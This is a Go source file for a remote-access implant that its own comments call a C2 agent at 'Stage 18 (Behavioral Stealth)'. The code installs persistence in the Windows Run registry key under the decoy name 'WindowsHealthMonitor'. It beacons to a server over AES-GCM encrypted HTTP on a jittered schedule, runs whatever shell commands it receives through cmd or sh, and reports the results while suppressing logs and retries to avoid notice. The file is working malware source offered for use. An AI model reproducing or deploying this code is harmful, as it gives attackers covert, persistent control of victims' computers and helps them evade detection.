/*
AGENT — Stage 18 (Behavioral Stealth)

Goal: Reduce noise and make traffic predictable.
- Single-purpose beacons (Alive, Ack, Result separate)
- "One send = One sleep" timing discipline
- Silent execution (No network during work)
- Fire-and-forget reporting (No retries)
*/

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	crand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

// =============================
// CONFIG
// =============================

var serverURL = "http://127.0.0.1:8080/beacon"
var secretKey = []byte("01234567890123456789012345678901")

// Registry Key Name
const persistenceName = "WindowsHealthMonitor"

var agentID = loadOrCreateAgentID()

// =============================
// STATE MACHINE
// =============================

type AgentState int

const (
	IDLE AgentState = iota
	SEND_ACK
	EXECUTING
	REPORTING
)

// =============================
// PROTOCOL STRUCTS
// =============================

type Beacon struct {
	AgentID string `json:"agent_id"`

	// 'omitempty' ensures we only send ONE of these at a time
	Status string `json:"status,omitempty"`  // Used in IDLE
	Ack    string `json:"ack,omitempty"`     // Used in SEND_ACK
	TaskID string `json:"task_id,omitempty"` // Used in REPORTING
	Output string `json:"output,omitempty"`  // Used in REPORTING
}

type Task struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

// =============================
// PERSISTENT STATE
// =============================

var executedTasks = make(map[string]bool)
var currentDir, _ = os.Getwd()

// =============================
// MAIN ENTRY POINT
// =============================

func main() {
	// 1. Install Persistence (Silent)
	installPersistence()

	// 2. Init Jitter
	mrand.Seed(time.Now().UnixNano())

	state := IDLE
	var pendingTask *Task
	var executionResult string

	// 3. Main Loop
	for {
		switch state {

		// ------------------------------------------
		// STATE: IDLE (Heartbeat)
		// ------------------------------------------
		case IDLE:
			// Action: Check in
			task := beacon(Beacon{
				AgentID: agentID,
				Status:  "alive",
			})

			// Rule: Always sleep after network
			sleepJitter()

			if task != nil {
				pendingTask = task
				state = SEND_ACK
			}
			// If nil, loop remains in IDLE

		// ------------------------------------------
		// STATE: SEND_ACK (Confirmation)
		// ------------------------------------------
		case SEND_ACK:
			// Action: Confirm receipt BEFORE executing
			beacon(Beacon{
				AgentID: agentID,
				Ack:     pendingTask.ID,
			})

			// Rule: Always sleep after network
			sleepJitter()

			// Check Logic: Have we done this before?
			if executedTasks[pendingTask.ID] {
				// Duplicate task. Ignore it.
				pendingTask = nil
				state = IDLE
			} else {
				// New task. Execute it.
				state = EXECUTING
			}

		// ------------------------------------------
		// STATE: EXECUTING (Silence)
		// ------------------------------------------
		case EXECUTING:
			// Rule: NO NETWORK here. Absolute silence.
			// The C2 server sees nothing.

			executionResult = executeCommand(pendingTask.Cmd)

			// Mark complete
			executedTasks[pendingTask.ID] = true

			// Move to report
			state = REPORTING

		// ------------------------------------------
		// STATE: REPORTING (Fire & Forget)
		// ------------------------------------------
		case REPORTING:
			// Action: Send result ONE time
			beacon(Beacon{
				AgentID: agentID,
				TaskID:  pendingTask.ID,
				Output:  executionResult,
			})

			// Rule: Cleanup immediately
			// We do not retry if this fails. We accept the loss to stay quiet.
			pendingTask = nil
			executionResult = ""

			// Rule: Always sleep after network
			sleepJitter()

			state = IDLE
		}
	}
}

// =============================
// HELPER: PERSISTENCE
// =============================

func installPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return
	}
	defer k.Close()

	val, _, err := k.GetStringValue(persistenceName)
	if err == nil && val == exePath {
		return // Already installed
	}
	_ = k.SetStringValue(persistenceName, exePath)
}

// =============================
// HELPER: JITTER (Timing Discipline)
// =============================

func sleepJitter() {
	// Base 10s +/- 3s
	// This creates a "heartbeat" that looks natural, not robotic.
	base := 10
	jitter := mrand.Intn(6) - 3
	time.Sleep(time.Duration(base+jitter) * time.Second)
}

// =============================
// HELPER: BEACON (Network)
// =============================

func beacon(b Beacon) *Task {
	// Rule: Failure = Quiet Backoff
	// We return nil on ANY error. We do not print logs.

	raw, _ := json.Marshal(b)
	enc, err := encrypt(raw)
	if err != nil {
		return nil
	}

	body, _ := json.Marshal(map[string]string{"data": enc})
	resp, err := http.Post(serverURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil
	}

	var response map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return nil
	}

	dec, err := decrypt(response["data"])
	if err != nil {
		return nil
	}

	var msg struct {
		Task *Task `json:"task"`
	}
	if err := json.Unmarshal(dec, &msg); err != nil {
		return nil
	}

	return msg.Task
}

// =============================
// HELPER: SYSTEM
// =============================

func loadOrCreateAgentID() string {
	const file = ".agent_id"
	if data, err := os.ReadFile(file); err == nil {
		return strings.TrimSpace(string(data))
	}
	id := generateAgentID()
	_ = os.WriteFile(file, []byte(id), 0600)
	return id
}

func generateAgentID() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func executeCommand(cmd string) string {
	if strings.HasPrefix(cmd, "cd ") {
		target := strings.TrimSpace(strings.TrimPrefix(cmd, "cd "))
		newDir := filepath.Join(currentDir, target)
		if err := os.Chdir(newDir); err != nil {
			return err.Error()
		}
		currentDir, _ = os.Getwd()
		return "Directory changed to " + currentDir
	}
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	c.Dir = currentDir
	out, err := c.CombinedOutput()
	if err != nil {
		return string(out) + "\nError: " + err.Error()
	}
	return string(out)
}

// =============================
// HELPER: CRYPTO
// =============================

func encrypt(data []byte) (string, error) {
	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(gcm.Seal(nonce, nonce, data, nil)), nil
}

func decrypt(enc string) ([]byte, error) {
	raw, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(raw) < nonceSize {
		return nil, io.ErrUnexpectedEOF
	}
	return gcm.Open(nil, raw[:nonceSize], raw[nonceSize:], nil)
}
